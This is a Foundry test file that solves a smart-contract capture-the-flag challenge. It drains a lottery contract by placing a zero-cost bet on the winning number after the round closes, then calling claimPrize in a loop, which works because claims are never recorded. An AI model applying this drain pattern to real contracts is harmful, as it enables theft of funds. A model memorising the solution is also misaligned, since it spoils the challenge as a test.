// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";

import {Challenge} from "src/##-ludopathy/Challenge.sol";
import {Ludopathy} from "src/##-ludopathy/Ludopathy.sol";

contract SolveTest is Test {
  uint256 internal constant INITIAL_POOL = 15 ether;
  uint256 internal constant CLAIM_UNIT = 1.5 ether;

  Challenge internal challenge;
  Ludopathy internal ludopathy;

  address internal deployer;
  address internal attacker;

  function setUp() public {
    deployer = makeAddr("deployer");
    attacker = makeAddr("attacker");

    vm.deal(deployer, INITIAL_POOL);

    vm.startPrank(deployer);
    ludopathy = new Ludopathy(deployer);
    challenge = new Challenge(ludopathy);

    // Seed round 1 with 15 ETH so it matches the challenge statement.
    uint96[] memory seededNumbers = new uint96[](1);
    uint200[] memory seededAmounts = new uint200[](1);
    seededNumbers[0] = 111;
    seededAmounts[0] = 15;
    ludopathy.largeBet{value: INITIAL_POOL}(seededNumbers, seededAmounts);

    // Winner already selected before attacker interaction.
    ludopathy.selectWinningNumber(777);
    vm.stopPrank();
  }

  function testSolve() public {
    uint48 roundId = ludopathy.currentRoundId();
    (uint96 winner,) = ludopathy.rounds(roundId);

    // Post-close free "bet": writes roundId for the winning number with zero cost.
    uint96[] memory numbers = new uint96[](1);
    uint200[] memory amounts = new uint200[](1);
    numbers[0] = winner;
    amounts[0] = 0;

    vm.prank(attacker);
    ludopathy.largeBet(numbers, amounts);

    // claimPrize never marks claimed and never decreases prizePool.
    while (address(ludopathy).balance >= CLAIM_UNIT) {
      vm.prank(attacker);
      ludopathy.claimPrize(roundId);
    }

    assertLt(address(ludopathy).balance, 1 ether);
    assertTrue(challenge.isSolved());
  }
}
